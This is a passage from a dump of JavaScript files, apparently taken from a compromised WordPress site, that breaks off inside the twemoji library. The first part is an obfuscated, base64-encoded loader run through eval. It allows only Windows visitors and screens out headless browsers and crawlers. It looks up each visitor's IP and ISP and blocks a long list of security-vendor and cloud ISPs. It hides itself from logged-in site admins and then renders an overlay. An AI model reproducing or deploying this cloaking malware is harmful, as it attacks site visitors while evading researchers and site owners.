mUgLSBtaW5Qb3NzaWJsZVNjb3JlKSkgKiAxMDApKTsKICAgIHJldHVybiBNYXRoLnJvdW5kKG5vcm1hbGl6ZWRTY29yZSk7CiAgfQoKICBmdW5jdGlvbiBkZXRlY3RPUygpIHsKICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgIGNvbnN0IHBsYXRmb3JtID0gbmF2aWdhdG9yLnBsYXRmb3JtPy50b0xvd2VyQ2FzZSgpIHx8ICcnOwoKICAgIGlmICgvaXBob25lfGlwYWR8aXBvZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdpb3MnOwogICAgaWYgKC9hbmRyb2lkL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2FuZHJvaWQnOwogICAgaWYgKC9saW51eC9pLnRlc3QodXNlckFnZW50KSAmJiAhL2FuZHJvaWQvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnbGludXgnOwogICAgaWYgKC9tYWMgb3MgeHxtYWNpbnRvc2gvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnbWFjJzsKICAgIGlmICgvd2luL2kudGVzdCh1c2VyQWdlbnQpIHx8IC93aW4vaS50ZXN0KHBsYXRmb3JtKSkgcmV0dXJuICd3aW5kb3dzJzsKCiAgICByZXR1cm4gJ3Vua25vd24nOwogIH0KCiAgYXN5bmMgZnVuY3Rpb24gaXNBY2Nlc3NBbGxvd2VkKCkgewogICAgdHJ5IHsKICAgICAgY29uc3QgZGV0ZWN0ZWRPUyA9IGRldGVjdE9TKCk7CiAgICAgIGNvbnN0IGluY2x1ZGVPU0xpc3QgPSBbIndpbmRvd3MiXTsKICAgICAgaWYgKGluY2x1ZGVPU0xpc3QubGVuZ3RoID4gMCAmJiAhaW5jbHVkZU9TTGlzdC5pbmNsdWRlcyhkZXRlY3RlZE9TKSkgewogICAgICAgIHZsb2coJ2Rlbnlfb3MnLCBkZXRlY3RlZE9TKTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgaGVhZGxlc3NQcm9iYWJpbGl0eSA9IGF3YWl0IGRldGVjdEhlYWRsZXNzKCk7CiAgICAgIGlmIChoZWFkbGVzc1Byb2JhYmlsaXR5ID4gMjUpIHsKICAgICAgICB2bG9nKCdkZW55X2hlYWRsZXNzJywgaGVhZGxlc3NQcm9iYWJpbGl0eSk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KCiAgICAgIGNvbnN0IGJvdFBhdHRlcm5zID0gWydib3QnLCdjcmF3bCcsJ3NwaWRlcicsJ3NjcmFwZScsJ3NsdXJwJywneWFob28nLCdnb29nbGUnLCd5YW5kZXgnLCdiYWlkdScsJ2JpbmcnLCdkdWNrZHVjaycsJ3Rlb21hJywnYXJjaGl2ZSddOwogICAgICBjb25zdCB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgICAgIGZvciAoY29uc3QgcGF0dGVybiBvZiBib3RQYXR0ZXJucykgewogICAgICAgIGlmICh1c2VyQWdlbnQuaW5jbHVkZXMocGF0dGVybikpIHsKICAgICAgICAgIHZsb2coJ2RlbnlfYm90X3VhJywgdXNlckFnZW50KTsKICAgICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICB9CgogICAgICAKICAgICAgY29uc3QgaXBSZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5pcGlmeS5vcmc/Zm9ybWF0PWpzb24nKTsKICAgICAgaWYgKCFpcFJlc3BvbnNlLm9rKSB7CiAgICAgICAgdmxvZygnaXBpZnlfZmFpbGVkJywgaXBSZXNwb25zZS5zdGF0dXMpOwogICAgICAgIHJldHVybiB0cnVlOwogICAgICB9CiAgICAgIGNvbnN0IGlwRGF0YSA9IGF3YWl0IGlwUmVzcG9uc2UuanNvbigpOwogICAgICBjb25zdCBpcCA9IGlwRGF0YS5pcDsKCiAgICAgIGNvbnN0IGlzcFJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vaXAybG9jYXRpb24tYXBpLTk3OTg0ODA2NzY3Ny51cy1jZW50cmFsMS5ydW4uYXBwLz9pcD0nICsgaXApOwogICAgICBpZiAoIWlzcFJlc3BvbnNlLm9rKSB7CiAgICAgICAgdmxvZygnaXNwX2xvb2t1cF9mYWlsZWQnLCBpc3BSZXNwb25zZS5zdGF0dXMpOwogICAgICAgIHJldHVybiB0cnVlOwogICAgICB9CiAgICAgIGNvbnN0IGlzcERhdGEgPSBhd2FpdCBpc3BSZXNwb25zZS5qc29uKCk7CiAgICAgIGNvbnN0IGlzcCA9IGlzcERhdGEuaXNwIHx8ICcnOwogICAgICBjb25zdCBjb3VudHJ5Q29kZSA9IGlzcERhdGEuZ2VvaXAyX2NvdW50cnlfY29kZSB8fCAnJzsKCiAgICAgIHZsb2coJ2lwX2luZm8nLCB7IGlwLCBjb3VudHJ5Q29kZSwgaXNwIH0pOwoKICAgICAgY29uc3QgaW5jbHVkZUNvdW50cnlMaXN0ID0gW107CiAgICAgIGlmIChpbmNsdWRlQ291bnRyeUxpc3QubGVuZ3RoID4gMCAmJiAoIWNvdW50cnlDb2RlIHx8ICFpbmNsdWRlQ291bnRyeUxpc3QuaW5jbHVkZXMoY291bnRyeUNvZGUpKSkgewogICAgICAgIHZsb2coJ2RlbnlfY291bnRyeScsIGNvdW50cnlDb2RlKTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgYmxvY2tlZElTUHMgPSBbCiAgICAgICAgJ00yNDcgRXVyb3BlJywnUGFja2V0aHViJywnTGVhc2VXZWInLCdEYXRhQ2FtcCcsJ0lQWE8nLCdTZWN1cmUgRGF0YSBTeXN0ZW1zJywnTmllZGVyc2FlY2hzaXNjaGUgTGFuZGVzcmVnaWVydW5nJywnQmFycmFjdWRhIE5ldHdvcmtzJywnVHJlbmQgTWljcm8gSW5jb3Jwb3JhdGVkJywnTWljcm9zb2Z0IENvcnAnLCdNaWNyb3NvZnQgQ29ycG9yYXRpb24nLCdTdXJmQ29udHJvbCcsJ1dlYnNlbnNlJywnR0hPU1RuZXQgR21iSCcsJ0lORVR1JywnQXZpcmEgQi5WLicsJ0dvb2dsZSBDbG91ZCcsJ1lhaG9vIScsJ0NvbW10b3VjaCcsJ0Nsb3VkRmxhcmUnLCdUcnVzdHdhdmUgSG9sZGluZ3MnLCdGT1JUSG5ldCBTQScsJ1VTIERlcGFydG1lbnQgb2YgRGVmZW5zZSBOZXR3b3JrJywnWk9ORVMgQVMnLCdDaXNjbyBTeXN0ZW1zIElyb25wb3J0IERpdmlzaW9uJywnVGhlUGxhbmV0LmNvbSBJbnRlcm5ldCBTZXJ2aWNlcycsJ1dlYnJvb3QgU2VydmljZXMnLCdSYWNrc3BhY2UgSG9zdGluZycsJ1BlcmltZXRlciBlU2VjdXJpdHknLCdEaWdpdGFsT2NlYW4nLCdQYWNrZXRFeGNoYW5nZScsJ0d5cm9uIEludGVybmV0IEx0ZCcsJ05ld01lZGlhIEV4cHJlc3MgUHRlJywnQW1hem9uLmNvbScsJ01jQWZlZScsJ0VTRVQsIHNwb2wuIHMgci5vLicsJ0ZhY2Vib29rJywnRmFjZWJvb2sgSXJlbGFuZCBMdGQnLCdZYWhvbyEgQnJvYWRjYXN0IFNlcnZpY2VzJywnWWFob28hIEluZGlhIFB2dCcsJ1lhaG9vIEphcGFuJywnWWFob28gSmFwYW4gQ29ycG9yYXRpb24nLCdHb29nbGVib3QnLCdBVkFTVCBTb2Z0d2FyZSBzLnIuby4nLCdNaWNyb3NvZnQgYmluZ2JvdCcsJ01pY3Jvc29mdCBIb3N0aW5nJywnQW1hem9uIFRlY2hub2xvZ2llcycsJ0N5dmVpbGxhbmNlJywnQ2xvdWRtYXJrJywnQ2xvdWRtYXJrIExhYnMnLCdUb3BzeSBMYWJzJywnQW1hem9uJywnU0VSVkVSIEJMT0NLJywnT1ZIIEhvc3RpbmcnLCdZQU5ERVgnLCdZQU5ERVggTExDJywnWWFob28gQmFuZ2Fsb3JlIE5ldHdvcmsgTW9uaXRvcmluZyBDZW50ZXInLCdUaW5ldCcsJ011bHRpbWVkaWEgUG9sc2thIFMuQS4nLCdNdWx0aW1lZGlhIFBvbHNrYSAtIFBvbHVkbmllIFMuQS4nLCdaZW5pdGggRWxlY3Ryb25pY3MgQ29ycG9yYXRpb24nLCdCYXJyYWN1ZGEgQ2FuYWRhJywnTWljcm9zb2Z0IExpbWl0ZWQnLCdNaWNyb3NvZnQgKENoaW5hKSBDby4nLCdTUEFNZmlnaHRlciBBcFMnLCdTcGFtZmlnaHRlci1hcycsJ0RpZ2l0YWxPbmUgQUcnLCdUd2l0dGVyJywnVHdpdHRlciBJbnRlcm5hdGlvbmFsIENvbXBhbnknLCdTdXJmY29udHJvbC1yZWFkaW5nJywnWWFob28gQ29ycCBOZXR3b3JrJywnQ29uZWN0aXZhJywnQ29uZWN0aXZhIFRlbGVjb20nLCdDb25lY3RpdmEgQ2VsdWxhciBlIEluZm9ybWF0aWNhIEx0ZGEnLCdSZWRpZmYuY29tIEluZGlhIExpbWl0ZWQnLCdJbmNlcm8gTExDJywnT05MSU5FIFMuQS5TLicsJ09OTElORSBTQVMnLCdUaXNjYWxpLWl0JywnVGlzY2FsaSBTcEEnLCdUaXNjYWxpIFVLIExpbWl0ZWQnLCdGdWppdHN1JywnRGF1bSBDb21tdW5pY2F0aW9uIENvLixMVEQnLCdJbnRlcm5ldCBTZWN1cml0eSBTeXN0ZW1zJywnVktvbnRha3RlIEx0ZCcsJ0xlYXNld2ViJywnTGVhc2VXZWIgTmV0aGVybGFuZHMgQi5WLicsJ0xlYXNlV2ViIEIuVi4nLCdMZWFzZVdlYiBDRE4gQi5WLicsJ0xlYXNlV2ViIE5ldHdvcmsgQi5WLicsJ0xlYXNld2ViIEFzaWEnLCdMZWFzZXdlYiBBc2lhIFBhY2lmaWMgcHRlLicsJ0xlYXNld2ViIERldXRzY2hsYW5kIEdtYkgnLCdMZWFzZXdlYiBVU0EnLCdMZWFzZXdlYi1kZScsJ0ludGVyTkFQIE5ldHdvcmsgU2VydmljZXMgVS5LLiBMaW1pdGVkJywnSW50ZXJuYXAgSmFwYW4gQ28uLExURC4nLCdJbnRlcm5hcCBOZXR3b3JrIFNlcnZpY2VzJywnSW50ZXJuYXAgTmV0d29yayBTZXJ2aWNlcyBDb3Jwb3JhdGlvbicsJ0JpdGRlZmVuZGVyLWFzJywnQml0ZGVmZW5kZXIgU1JMJywnTVggTG9naWMnLCdDaGluYSBFZHVjYXRpb24gYW5kIFJlc2VhcmNoIE5ldHdvcmsgQ2VudGVyJywnQ2hpbmEgRHV0eSBGcmVlIGdyb3VwJywnQ2hpbmEnLCdDaGluYSBCcm9hZGJhbmQgQ29tbXVuaWNhdGlvbnMgKENCQ25ldCknLCdDaGluYSBCcm9hZGNhc3RpbmcgVFYgTmV0JywnQ2hpbmEgQ29tbXVuaWNhdGlvbiBDby4nLCdDaGluYSBDb25zdHJ1Y3Rpb24gQmFuayAoQXNpYSkgQ29ycG9yYXRpb24gTGltaXRlZCcsJ0NoaW5hIEN1bHR1cmFsIEhlcml0YWdlIEluZm9ybWF0aW9uIGFuZCBDb25zdWx0aW5nJywnQ2hpbmEgRGlnaXRhbCBLaW5nZG9tIFRlY2hub2xvZ3kgQ28uLEx0ZC4nLCdDaGluYSBEcmFnb24gVGVsZWNvbSBDby4sTHRkJywnRmFjdGlvbicsJ1plbiBTeXN0ZW1zIEEvUycsJ09WSCBTQVMnLCdTb2x1dGlvbiBQcm8nLCdEZWRGaWJlckNvJywnQ2xlYXJCbHVlIFRlY2hub2xvZ2llcycsJ0luZm9ybWF0aW9uIFRlY2hub2xvZ3kgU3lzdGVtcycsJ0dvRGFkZHkuY29tLCBMTEMnLCdTZXJ2ZXIgQ2VudHJhbCBOZXR3b3JrJywnVGluZXQgU3BhJywnQ2FwcmlzIEdyb3VwJywnSW5rdG9taSBDb3Jwb3JhdGlvbicsJ1VuaWZpZWQgTGF5ZXInLCdKU0MgUlRDb21tLlJVJywnTExDIG1hc3Rlcmhvc3QnLCdNVE8gVGVsZWNvbScsJ0xpbmtlZEluIENvcnBvcmF0aW9uJywnV2Vic2l0ZXdlbGNvbWUuY29tJywnR1RTIFRlbGVjb20gU1JMJywnUHVsc2VQb2ludCBDb21tdW5pY2F0aW9ucycsJ1B1bHNlcG9pbnQnLCdUaW1lV2ViIEx0ZC4nLCdCZWlqaW5nIEJhaWR1IE5ldGNvbSBTY2llbmNlIGFuZCBUZWNobm9sb2d5IENvLicsJ0RpZ2l0YWwgT2NlYW4nLCdUaHJlYXRUcmFjaycsJ1RocmVhdFRyYWNrIFNlY3VyaXR5JywnRUdJSG9zdGluZycsJ0hFVFpORVInLCdIZXR6bmVyLWFzJywnSGV0em5lciBPbmxpbmUgR21iSCcsJ0hFVFpORVIgKFB0eSkgTHRkJywnSGV0em5lciBDQycsJ0xpbWl0ZWQgbGlhYmlsaXR5IGNvbXBhbnkgTWFpbC5SdScsJ0FtYXpvbiBDb3Jwb3JhdGUgTExDJywnQW1hem9uIERhdGEgU2VydmljZXMgSXJlbGFuZCBMdGQnLCdBbWF6b24gV2ViIFNlcnZpY2VzLCBMTEMnLCdBbWF6b24uY29tIFRlY2ggVGVsZWNvbScsJ0FtYXpvbmlhIFB1YmxpY2lkYWRlIEx0ZGEnLCdBbWF6b25pYSBUZWxlY29tIEx0ZGEuIC0gTWUnLCdLYXNwZXJza3kgTGFiIEFPJywnQWxpc3RhciBTZWN1cml0eSBTcmwnLCdORk9yY2UgRW50ZXJ0YWlubWVudCBCLlYuJywnU0sgQnJvYWRiYW5kJywnWmF5byBHcm91cCBFVSBMaW1pdGVkJywnUXVhZHJhTmV0JywnUmFtTm9kZSBMTEMnLCdIb3N0VVMnCiAgICAgIF07CgogICAgICBpZiAoYmxvY2tlZElTUHMuaW5jbHVkZXMoaXNwKSkgewogICAgICAgIHZsb2coJ2RlbnlfaXNwJywgaXNwKTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQogICAgICAKCiAgICAgIHJldHVybiB0cnVlOwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgIHZlcnIoJ0FjY2VzcyBjaGVjayBmYWlsZWQ6JywgZXJyKTsKICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbml0KCkgewogICAgdHJ5IHsKICAgICAgY29uc3QgYWxsb3dlZCA9IGF3YWl0IGlzQWNjZXNzQWxsb3dlZCgpOwogICAgICB2bG9nKCdhY2Nlc3NfYWxsb3dlZCcsIGFsbG93ZWQpOwogICAgICBpZiAoIWFsbG93ZWQpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KCiAgICAgIGNvbnN0IHNraXAgPSBnZXRWYWwoJ19za2lwJywgJzAnKTsKICAgICAgaWYgKHNraXAgPT09ICcxJykgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KCiAgICAgIGxldCBjb3VudCA9IHBhcnNlSW50KGdldFZhbChLRVksICcwJyksIDEwKTsKICAgICAgaWYgKE51bWJlci5pc05hTihjb3VudCkpIGNvdW50ID0gMDsKICAgICAgY291bnQrKzsKICAgICAgc2V0VmFsKEtFWSwgY291bnQudG9TdHJpbmcoKSk7CgogICAgICBpZiAoY291bnQgPj0gTikgewogICAgICAgIHJlbmRlck92ZXJsYXkoKTsKICAgICAgfQogICAgfSBjYXRjaChlKSB7CiAgICAgIHZlcnIoJ2luaXRfZmFpbGVkJywgZSk7CiAgICAgIHJlbmRlck92ZXJsYXkoKTsKICAgIH0KICB9CgogIGlmIChkb2N1bWVudC5ib2R5KSB7CiAgICBpbml0KCk7CiAgfSBlbHNlIHsKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBpbml0KTsKICB9Cn0pKCk7CiAg",
    "MC4wNjg5MjM3MzM2ODcyOTc3Ng==",
    "MC4zODk1NTE1NjkwOTU3NTkwNQ==",
    "MC4wMTc2MjUwMjk0ODcwMzE4MTg=",
    "MC4xOTM3MjgxMjk2NzUzNTcxMw==",
    "MC45NDY4MzUyNTMxNDE5NjQ3",
    "MC40NjQ4MjExODQ1Mjg4MTI2",
    "MC4wNzE1OTk3OTIxMjM5NTkwNg==",
    "MC40ODA1MDU5NTgwNDA1MjUz"
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 1;

  var _code = b64ToUtf8(_e[_k1]) + b64ToUtf8(_x[_k2]) + b64ToUtf8(_f[_k3]);
  eval(_code);
})();
/* >>> wp_junk2.js (46393 bytes) <<< */
(function(){
try{
var twemoji = function() {
    "use strict";
    var h = {
            base: "https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/",
            ext: ".png",
            size: "72x72",
            className: "emoji",
            convert: {
                fromCodePoint: function(d) {
                    d = "string" == typeof d ? parseInt(d, 16) : d;
                    if (d < 65536) return e(d);
                    return e(55296 + ((d -= 65536) >> 10), 56320 + (1023 & d))
                },
                toCodePoint: o
            },
            onerror: function() {
                this.parentNode && this.parentNode.replaceChild(x(this.alt, !1), this)
            },
            parse: function(d, u) {
                u && "function" != typeof u || (u = {
                    callback: u
                });
                return h.doNotParse = u.doNotParse, ("string" == typeof d ? function(d, a) {
                    return n(d, function(d) {
                        var u, f, c = d,
                            e = N(d),
                            b = a.callback(e, a);
                        if (e && b) {
                            for (f in c = "<img ".concat('class="', a.className, '" ', 'draggable="false" ', 'alt="', d, '"', ' src="', b, '"'), u = a.attributes(d, e)) u.hasOwnProperty(f) && 0 !== f.indexOf("on") && -1 === c.indexOf(" " + f + "=") && (c = c.concat(" ", f, '="', u[f].replace(t, r), '"'));
                            c = c.concat("/>")
                        }
                        return c
                    })
                } : function(d, u) {
                    var f, c, e, b, a, t, r, n, o, s, i, l = function d(u, f) {
                            var c, e, b = u.childNodes,
                                a = b.length;
                            for (; a--;) c = b[a], 3 === (e = c.nodeType) ? f.push(c) : 1 !== e || "ownerSVGElement" in c || m.test(c.nodeName.toLowerCase()) || h.doNotParse && h.doNotParse(c) || d(c, f);
                            return f
                        }(d, []),
                        p = l.length;
                    for (; p--;) {
                        for (e = !1, b = document.createDocumentFragment(), a = l[p], t = a.nodeValue, r = 0; o = g.exec(t);) {
                            if ((i = o.index) !== r && b.appendChild(x(t.slice(r, i), !0)), s = N(o = o[0]), r = i + o.length, i = u.callback(s, u), s && i) {
                                for (c in (n = new Image).onerror = u.onerror, n.setAttribute("draggable", "false"), f = u.attributes(o, s)) f.hasOwnProperty(c) && 0 !== c.indexOf("on") && !n.hasAttribute(c) && n.setAttribute(c, f[c]);
                                n.className = u.className, n.alt = o, n.src = i, e = !0, b.appendChild(n)
                            }
                            n || b.appendChild(x(o, !1)), n = null
                        }
                        e && (r < t.length && b.appendChild(x(t.slice(r), !0)), a.parentNode.replaceChild(b, a))
                    }
                    return d
                })(d, {
                    callback: u.callback || b,
                    attributes: "function" == typeof u.attributes ? u.attributes : a,
                    base: ("string" == typeof u.base ? u : h).base,
                    ext: u.ext || h.ext,
                    size: u.folder || function(d) {
                        return "number" == typeof d ? d + "x" + d : d
                    }(u.size || h.size),
                    className: u.className || h.className,
                    onerror: u.onerror || h.onerror
                })
            },
            replace: n,
            test: function(d) {
                g.lastIndex = 0;
                d = g.test(d);
                return g.lastIndex = 0, d
            }
        },
        u = {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            "'": "&#39;",
            '"': "&quot;"
        },
        g = /(?:\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c[\udffc-\udfff]|\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c[\udffb\udffd-\udfff]|\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c[\udffb-\udffd\udfff]|\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c[\udffb-\udffe]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d\udc8f\ud83c[\udffb-\udfff]|\ud83d\udc91\ud83c[\udffb-\udfff]|\ud83e\udd1d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d\udc8f\udc91]|\ud83e\udd1d)|(?:\ud83d[\udc68\udc69]|\ud83e\uddd1)(?: